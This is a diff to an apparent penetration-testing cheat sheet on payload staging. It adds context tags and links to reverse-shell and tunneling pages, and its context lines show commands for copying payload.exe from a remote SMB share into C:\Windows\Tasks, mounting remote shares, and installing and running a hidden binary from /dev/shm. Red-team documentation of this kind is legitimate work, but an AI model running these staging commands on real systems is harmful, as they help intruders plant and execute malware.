@@ -10,7 +10,7 @@ Short staging and non-HTTP file-transfer helpers.
 copy \\<HOST>\share\payload.exe C:\Windows\Tasks\payload.exe
 ```
 
-**Tool:** SMB · **Platform:** Windows · **Tags:** SMB, File Transfer, Staging
+**Tool:** SMB · **Platform:** Windows · **Tags:** SMB, File Transfer, Staging · **Context:** User
 
 ## Mount SMB share with PowerShell
 
@@ -18,7 +18,7 @@ copy \\<HOST>\share\payload.exe C:\Windows\Tasks\payload.exe
 New-PSDrive -Name X -PSProvider FileSystem -Root \\<HOST>\share
 ```
 
-**Tool:** PowerShell · **Platform:** Windows · **Tags:** SMB, File Transfer
+**Tool:** PowerShell · **Platform:** Windows · **Tags:** SMB, File Transfer · **Context:** User
 
 ## Test Windows Tasks write access
 
@@ -26,7 +26,7 @@ New-PSDrive -Name X -PSProvider FileSystem -Root \\<HOST>\share
 $p='C:\Windows\Tasks\ol-test.tmp';'test'|Set-Content $p;Get-Item $p;Remove-Item $p
 ```
 
-**Tool:** PowerShell · **Platform:** Windows · **Tags:** Staging, Writable Path
+**Tool:** PowerShell · **Platform:** Windows · **Tags:** Staging, Writable Path · **Context:** User
 
 ## Stage executable in /dev/shm
 
@@ -34,7 +34,7 @@ $p='C:\Windows\Tasks\ol-test.tmp';'test'|Set-Content $p;Get-Item $p;Remove-Item 
 install -m 700 <FILE> /dev/shm/.p && /dev/shm/.p
 ```
 
-**Tool:** install · **Platform:** Linux · **Tags:** tmpfs, Staging, Execution
+**Tool:** install · **Platform:** Linux · **Tags:** tmpfs, Staging, Execution · **Context:** User
 
 ## Check /dev/shm mount
 
@@ -42,7 +42,11 @@ install -m 700 <FILE> /dev/shm/.p && /dev/shm/.p
 findmnt /dev/shm -o TARGET,FSTYPE,OPTIONS
 ```
 
-**Tool:** findmnt · **Platform:** Linux · **Tags:** tmpfs, Mounts
+**Tool:** findmnt · **Platform:** Linux · **Tags:** tmpfs, Mounts · **Context:** User
 
 !!! note "Path visibility"
     `C:\Windows\Tasks` and `/dev/shm` are familiar investigation locations. Treat them as convenient staging paths, not stealth guarantees.
+
+---
+
+**Related:** [Overview](./) · [Reverse Shells](reverse-shells.md) · [Tunneling](tunneling.md)
